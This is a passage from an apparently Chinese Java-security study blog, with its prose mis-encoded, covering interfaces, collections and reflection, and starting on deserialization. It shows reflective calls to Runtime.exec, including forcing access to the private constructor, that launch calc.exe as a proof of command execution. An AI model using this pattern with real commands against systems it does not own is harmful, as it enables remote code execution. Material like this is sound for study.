title="æ¥å£çš„å®ç°"></a>æ¥å£çš„å®ç°</h3><p>å½“ç±»å®ç°æ¥å£çš„æ—¶å€™ï¼Œç±»è¦å®ç°æ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•ã€‚å¦åˆ™ï¼Œç±»å¿…é¡»å£°æ˜ä¸ºæŠ½è±¡çš„ç±»ã€‚</p><p>Animal.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dog.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog travel&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.eat();</span><br><span class="line">        dog.travel();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º Dog eat</span></span><br><span class="line"><span class="comment">//   Dog travel</span></span><br></pre></td></tr></table></figure><h3 id="æ¥å£çš„å¤šç»§æ‰¿"><a href="#æ¥å£çš„å¤šç»§æ‰¿" class="headerlink" title="æ¥å£çš„å¤šç»§æ‰¿"></a>æ¥å£çš„å¤šç»§æ‰¿</h3><p>åœ¨Javaä¸­ï¼Œç±»çš„å¤šç»§æ‰¿æ˜¯ä¸åˆæ³•ï¼Œä½†æ¥å£å…è®¸å¤šç»§æ‰¿ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hockey</span> <span class="keyword">extends</span> <span class="title class_">Sports</span>, Event</span><br></pre></td></tr></table></figure><h2 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h2><p>åœ¨Javaä¸­ï¼Œé›†åˆï¼ˆCollectionï¼‰æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨å’Œæ“ä½œä¸€ç»„å¯¹è±¡çš„æ•°æ®ç»“æ„ã€‚é›†åˆæ¡†æ¶ï¼ˆCollection Frameworkï¼‰æ˜¯Javaä¸­çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†ï¼Œæä¾›äº†ä¸€ç³»åˆ—æ¥å£å’Œç±»ï¼Œç”¨äºè¡¨ç¤ºå’Œæ“ä½œä¸åŒç±»å‹çš„é›†åˆã€‚Javaçš„é›†åˆæ¡†æ¶ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ¥å£å’Œç±»ï¼š</p><ol><li><strong>Collection æ¥å£ï¼š</strong> æ˜¯æ‰€æœ‰é›†åˆæ¡†æ¶çš„æ ¹æ¥å£ï¼Œå®ƒå®šä¹‰äº†ä¸€äº›åŸºæœ¬çš„æ–¹æ³•ï¼Œå¦‚æ·»åŠ ã€åˆ é™¤ã€éå†ç­‰ã€‚<code>List</code>ã€<code>Set</code> å’Œ <code>Queue</code> æ¥å£éƒ½ç»§æ‰¿è‡ª <code>Collection</code>ã€‚</li><li><strong>List æ¥å£ï¼š</strong> ç»§æ‰¿è‡ª <code>Collection</code>ï¼Œè¡¨ç¤ºæœ‰åºçš„é›†åˆï¼Œå…è®¸åŒ…å«é‡å¤å…ƒç´ ã€‚å¸¸è§çš„å®ç°ç±»åŒ…æ‹¬ <code>ArrayList</code>ã€<code>LinkedList</code> å’Œ <code>Vector</code>ã€‚</li><li><strong>Set æ¥å£ï¼š</strong> ä¹Ÿç»§æ‰¿è‡ª <code>Collection</code>ï¼Œè¡¨ç¤ºä¸åŒ…å«é‡å¤å…ƒç´ çš„é›†åˆã€‚å¸¸è§çš„å®ç°ç±»åŒ…æ‹¬ <code>HashSet</code>ã€<code>LinkedHashSet</code> å’Œ <code>TreeSet</code>ã€‚</li><li><strong>Queue æ¥å£ï¼š</strong> ç»§æ‰¿è‡ª <code>Collection</code>ï¼Œè¡¨ç¤ºä¸€ç§é˜Ÿåˆ—çš„æ•°æ®ç»“æ„ï¼Œå¸¸è§çš„å®ç°ç±»åŒ…æ‹¬ <code>LinkedList</code> å’Œ <code>PriorityQueue</code>ã€‚</li><li><strong>Map æ¥å£ï¼š</strong> è¡¨ç¤ºé”®å€¼å¯¹çš„é›†åˆï¼Œæ¯ä¸ªé”®æ˜ å°„åˆ°ä¸€ä¸ªå€¼ã€‚å¸¸è§çš„å®ç°ç±»åŒ…æ‹¬ <code>HashMap</code>ã€<code>LinkedHashMap</code>ã€<code>TreeMap</code> å’Œ <code>HashTable</code>ã€‚</li></ol><h1 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h1><p>åå°„æœ‰å…³çš„APIï¼š</p><blockquote><p>java.lang.Class: ä»£è¡¨ä¸€ä¸ªç±»<br>java.lang.reflect.Method: ä»£è¡¨ç±»çš„æ–¹æ³•<br>java.lang.relect.Field: ä»£è¡¨ç±»çš„æˆå‘˜å˜é‡<br>java.lang.reflect.Constructor: ä»£è¡¨ç±»çš„æ„é€ å™¨</p></blockquote><p>ç”±äºClassç±»æ˜¯privateç§æœ‰å±æ€§, å…¶æ„é€ å™¨æ˜¯ç§æœ‰çš„, æˆ‘ä»¬æ— æ³•ç›´æ¥new Class();å›´ç»•å¦‚ä½•è·å–Classç±»çš„å¯¹è±¡æ¥å­¦ä¹ åå°„æœºåˆ¶</p><h2 id="ç±»çš„-classå±æ€§"><a href="#ç±»çš„-classå±æ€§" class="headerlink" title="ç±»çš„.classå±æ€§"></a>ç±»çš„.classå±æ€§</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Person.class;  <span class="comment">///////////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å‡º: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹åŒ–å¯¹è±¡çš„getClass-æ–¹æ³•"><a href="#å®ä¾‹åŒ–å¯¹è±¡çš„getClass-æ–¹æ³•" class="headerlink" title="å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•"></a>å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> p1.getClass(); <span class="comment">/////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º: I am n4c1, and I am 19 years old.</span></span><br><span class="line"><span class="comment">//class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="Class-forName-String-className-ï¼šåŠ¨æ€åŠ è½½ç±»"><a href="#Class-forName-String-className-ï¼šåŠ¨æ€åŠ è½½ç±»" class="headerlink" title="Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±»"></a>Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±»</h2><p>è°ƒç”¨Classç±»ä¸­çš„forNameæ–¹æ³•ï¼Œå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œè¿”å›Classå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å‡º: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><blockquote><p>ä½†åœ¨è¿™ä¸‰ç§è·å–CLassç±»æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸‰ç§é€šè¿‡Class.forNameæ–¹æ³•å»åŠ¨æ€åŠ è½½ç±»ã€‚ä¸”ä½¿ç”¨forNameå°±ä¸éœ€è¦importå¯¼å…¥å…¶ä»–ç±»ï¼Œå¯ä»¥åŠ è½½æˆ‘ä»¬ä»»æ„çš„ç±»ã€‚</p><p>è€Œä½¿ç”¨ç±».classå±æ€§ï¼Œéœ€è¦å¯¼å…¥ç±»çš„åŒ…ï¼Œä¾èµ–æ€§å¤ªå¼ºï¼Œåœ¨å¤§å‹é¡¹ç›®ä¸­å®¹æ˜“æŠ›å‡ºç¼–è¯‘é”™è¯¯ï¼›</p><p>è€Œä½¿ç”¨å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•ï¼Œéœ€è¦æœ¬èº«åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæœ¬èº«å°±æ²¡æœ‰äº†ä½¿ç”¨åå°„æœºåˆ¶æ„ä¹‰ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨è·å–classå¯¹è±¡ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨Class.forNameæ–¹æ³•å»è·å–ã€‚</p></blockquote><h2 id="è·å–æˆå‘˜å˜é‡Field"><a href="#è·å–æˆå‘˜å˜é‡Field" class="headerlink" title="è·å–æˆå‘˜å˜é‡Field"></a>è·å–æˆå‘˜å˜é‡Field</h2><blockquote><p>è·å–æˆå‘˜å˜é‡Fieldä½äºjava.lang.reflect.FieldåŒ…ä¸­</p><p>Field[] getFields() ï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡</p><p>Field[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦</p><p>Field getField(String name) è·å–æŒ‡å®šåç§°çš„ publicä¿®é¥°çš„æˆå‘˜å˜é‡</p><p>Field getDeclaredField(String name) è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">        Field[] fieldArray1 = c3.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fieldArray1) &#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡º:</span></span><br><span class="line"><span class="comment">// com.n4c1.www.Person</span></span><br><span class="line"><span class="comment">// name</span></span><br><span class="line"><span class="comment">// age</span></span><br></pre></td></tr></table></figure><h2 id="è·å–æˆå‘˜æ–¹æ³•Method"><a href="#è·å–æˆå‘˜æ–¹æ³•Method" class="headerlink" title="è·å–æˆå‘˜æ–¹æ³•Method"></a>è·å–æˆå‘˜æ–¹æ³•Method</h2><blockquote><p><strong>Method getMethod(String name, ç±»&lt;?&gt;â€¦ parameterTypes)</strong> &#x2F;&#x2F;è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³•</p><p><strong>Method getDeclaredMethod(String name, ç±»&lt;?&gt;â€¦ parameterTypes)</strong> &#x2F;&#x2F;è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³•</p><p>&#x2F;&#x2F;ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹</p><p><strong>Method[] getMethods()</strong> &#x2F;&#x2F;è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•</p><p><strong>Method[] getDeclaredMethods()</strong> &#x2F;&#x2F; è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•</p></blockquote><h2 id="è·å–æ„é€ å‡½æ•°Constructor"><a href="#è·å–æ„é€ å‡½æ•°Constructor" class="headerlink" title="è·å–æ„é€ å‡½æ•°Constructor"></a>è·å–æ„é€ å‡½æ•°Constructor</h2><blockquote><p>Constructor&lt;?&gt;[] getConstructors() ï¼šåªè¿”å›publicæ„é€ å‡½æ•°</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•°</p><p>Constructor&lt;&gt; getConstructor(ç±»&lt;?&gt;â€¦ parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„publicæ„é€ å‡½æ•°</p><p>Constructor&lt;&gt; getDeclaredConstructor(ç±»&lt;?&gt;â€¦ parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•°</p></blockquote><h2 id="é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡"><a href="#é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡"></a>é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡</h2><h3 id="newInstance-æ–¹æ³•åˆ›å»ºç±»å¯¹è±¡"><a href="#newInstance-æ–¹æ³•åˆ›å»ºç±»å¯¹è±¡" class="headerlink" title="newInstance()æ–¹æ³•åˆ›å»ºç±»å¯¹è±¡"></a>newInstance()æ–¹æ³•åˆ›å»ºç±»å¯¹è±¡</h3><h3 id="invoke-æ‰§è¡Œç±»å¯¹è±¡æ–¹æ³•"><a href="#invoke-æ‰§è¡Œç±»å¯¹è±¡æ–¹æ³•" class="headerlink" title="invoke()æ‰§è¡Œç±»å¯¹è±¡æ–¹æ³•"></a>invoke()æ‰§è¡Œç±»å¯¹è±¡æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reflectMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åå°„æµ‹è¯•æˆåŠŸ!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.reflect.ReflectTest&quot;</span>); <span class="comment">// åˆ›å»ºClasså¯¹è±¡</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance(); <span class="comment">// åˆ›å»ºç±»å®ä¾‹å¯¹è±¡</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;reflectMethod&quot;</span>); <span class="comment">// è·å–reflectMethodæ–¹æ³•</span></span><br><span class="line">            method.invoke(m); <span class="comment">// è°ƒç”¨ç±»å®ä¾‹å¯¹è±¡æ–¹æ³•</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ"><a href="#åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ"></a>åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ</h2><p>åå°„å¼¹è®¡ç®—å™¨</p><p><code>C:\\WINDOWS\\System32\\calc.exe</code></p><p>Runtimeç±»çš„æ„é€ æ–¹æ³•æ˜¯privateæƒé™ç§æœ‰çš„,åå°„æœºåˆ¶ä¹Ÿæ˜¯æœ‰é™åˆ¶çš„ï¼Œå¹¶ä¸èƒ½é¥¶è¿‡privateæƒé™çš„æ£€æŸ¥ã€‚</p><p>å› æ­¤æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨newInstance()æ¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡Runtime()</p><p>ä½†æ˜¯å¯ä»¥ç›´æ¥è°ƒç”¨å…¶ç±»æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">RuntimeMethod</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//é€šè¿‡ getMethod æ–¹æ³•è·å– Runtime ç±»ä¸­çš„ getRuntime æ–¹æ³•çš„ Method å¯¹è±¡ã€‚è¿™ä¸ªæ–¹æ³•ç”¨äºè·å–å½“å‰è¿è¡Œæ—¶å¯¹è±¡ã€‚</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> RuntimeMethod.invoke(c1); <span class="comment">//ä½¿ç”¨åå°„è°ƒç”¨ getRuntime æ–¹æ³•ï¼Œå¾—åˆ° Runtime ç±»çš„å®ä¾‹ã€‚invoke æ–¹æ³•ç”¨äºè°ƒç”¨æŒ‡å®šå¯¹è±¡çš„æ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨äº† getRuntime æ–¹æ³•ã€‚</span></span><br><span class="line">        method.invoke(m, <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€åŒ–:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(c1),<span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="è®¾ç½®setAccessible-true-æš´åŠ›è®¿é—®æƒé™"><a href="#è®¾ç½®setAccessible-true-æš´åŠ›è®¿é—®æƒé™" class="headerlink" title="è®¾ç½®setAccessible(true)æš´åŠ›è®¿é—®æƒé™"></a>è®¾ç½®setAccessible(true)æš´åŠ›è®¿é—®æƒé™</h2><blockquote><p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æœºåˆ¶ä¸èƒ½å¯¹ç±»çš„ç§æœ‰privateå­—æ®µè¿›è¡Œæ“ä½œï¼Œç»•è¿‡ç§æœ‰æƒé™çš„è®¿é—®ã€‚ä½†ä¸€äº›ç‰¹æ®Šåœºæ™¯å­˜åœ¨ä¾‹å¤–çš„æ—¶å€™ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ï¼Œéœ€è¦å»è®¿é—®è¿™äº›å—é™çš„ç§æœ‰å­—æ®µï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨AccessibleObjectä¸Šçš„setAccessible()æ–¹æ³•æ¥å…è®¸è®¿é—®ã€‚</p><p>Java.lang.reflect.AccessibleObjectç±»æ˜¯Fieldï¼ŒMethodå’ŒConstructorç±»å¯¹è±¡çš„åŸºç±»ï¼Œå¯ä»¥æä¾›å°†åå°„å¯¹è±¡æ ‡è®°ä¸ºä½¿ç”¨å®ƒæŠ‘åˆ¶æ‘¸äººJavaè®¿é—®æ§åˆ¶æ£€æŸ¥çš„åŠŸèƒ½ï¼ŒåŒæ—¶ä¸Šè¿°çš„åå°„ç±»ä¸­çš„Fieldï¼ŒMethodå’ŒConstructorç»§æ‰¿è‡ªAccessibleObjectã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è¿™äº›ç±»æ–¹æ³•åŸºç¡€ä¸Šè°ƒç”¨setAccessible()æ–¹æ³•ï¼Œæ—¢å¯å¯¹è¿™äº›ç§æœ‰å­—æ®µè¿›è¡Œæ“ä½œã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å¹¶æ²¡æœ‰æˆåŠŸå¼¹è®¡ç®—å™¨, ä¸çŸ¥é“æ˜¯ä¸æ˜¯jdkç‰ˆæœ¬çš„é—®é¢˜</p><p>æ¢æˆjdk1.8è¿™é‡Œå°±å¯ä»¥äº†</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309112318876.png" alt="image-20240309112318876"></p><h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><p><strong>åºåˆ—åŒ–</strong>: ObjectOutputStream.WriteObject</p><p><strong>ååºåˆ—åŒ–</strong>: ObjectInputStream.readObject</p><blockquote><p>åªæœ‰å®ç° äº†Serializable æˆ–è€… Externalizable æ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—</p><p>Serializable æ¥å£æ˜¯ Java 